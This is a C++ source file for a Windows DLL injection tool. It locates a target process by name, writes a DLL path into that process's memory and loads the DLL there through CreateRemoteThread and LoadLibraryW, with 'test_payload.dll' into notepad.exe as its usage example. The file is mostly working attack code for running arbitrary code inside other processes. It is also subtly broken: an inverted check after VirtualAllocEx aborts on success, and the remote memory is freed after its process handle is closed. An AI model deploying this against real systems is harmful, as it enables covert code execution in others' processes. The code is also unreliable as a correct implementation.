// dll_injection.cpp

#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

DWORD fnGetProcessIdByName(const wchar_t* processName)
{
	DWORD nPid = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
	{
		printf("[-] CreateToolhelp32Snapshot failed, ErrorCode: %lu\n", GetLastError());
		return 0;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(hSnapshot, &pe32))
	{
		do
		{
			if (_wcsicmp(pe32.szExeFile, processName) == 0)
			{
				nPid = pe32.th32ProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);

	return nPid;
}

BOOL fnInjectDLL(DWORD nPid, const wchar_t* dllPath)
{
	BOOL bSuccess = FALSE;
	HANDLE hProcess = NULL;
	LPVOID pRemotePath = NULL;
	HANDLE hThread = NULL;

	hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
		FALSE,
		nPid
	);

	if (!hProcess)
	{
		printf("[-] OpenProcess failed, ErrorCode: %lu\n", GetLastError());
		goto cleanup;
	}

	size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

	pRemotePath = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemotePath)
	{
		printf("[-] VirtualAllocEx failed, ErrorCode; %lu\n", GetLastError());
		goto cleanup;
	}

	if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, pathSize, NULL))
	{
		printf("[-] WriteProcessMemory failed, ErrorCode: %lu\n", GetLastError());
		goto cleanup;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	if (!pLoadLibraryW)
	{
		printf("[-] GetProcAddress(LoadLibraryW) failed, ErrorCode: %lu\n", GetLastError());
		goto cleanup;
	}

	hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pRemotePath, 0, NULL);
	if (!hThread)
	{
		printf("[-] CreateRemoteThread failed, ErrorCode: %lu\n", GetLastError());
		goto cleanup;
	}

	WaitForSingleObject(hThread, INFINITE);

	DWORD nCode = 0;
	if (GetExitCodeThread(hThread, &nCode) && nCode != 0)
	{
		printf("[+] Remote thread finished, module handle: 0x%lx\n", nCode);
		bSuccess = TRUE;
	}
	else
	{
		printf("[-] LoadLibraryW likely failed in remote process\n");
	}

cleanup:
	if (hThread)
		CloseHandle(hThread);
	if (hProcess)
		CloseHandle(hProcess);
	if (pRemotePath)
		VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);

	return bSuccess;
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc < 3)
	{
		printf("Usage   : %ls <Target process name> <DLL path>\n", argv[0]);
		printf("Example : %ls notepad.exe test_payload.dll\n", argv[0]);

		return 1;
	}

	const wchar_t* targetProcess = argv[1];
	const wchar_t* dllPath = argv[2];

	wchar_t fullDllPath[MAX_PATH];
	if (GetFullPathNameW(dllPath, MAX_PATH, fullDllPath, NULL) == 0)
	{
		printf("[-] Cannot resolve DLL path, ErrorCode: %lu\n", GetLastError());
		return 1;
	}

	if (INVALID_FILE_ATTRIBUTES == GetFileAttributesW(fullDllPath))
	{
		printf("[-] Cannot find the DLL: %ls\n", fullDllPath);
		return 1;
	}

	printf("[*] Target process: %ls\n", targetProcess);
	printf("[*] DLL path: %ls\n", fullDllPath);

	DWORD pid = fnGetProcessIdByName(targetProcess);
	if (pid == 0)
	{
		printf("[-] Cannot find the process: %ls\n", targetProcess);
		return 1;
	}

	printf("[+] Process is found, PID: %lu\n", pid);
	
	if (!fnInjectDLL(pid, fullDllPath))
	{
		printf("[-] DLL injection failed.\n");
		return 1;
	}

	printf("[+] DLL injection succeeded!\n");

	return 0;
}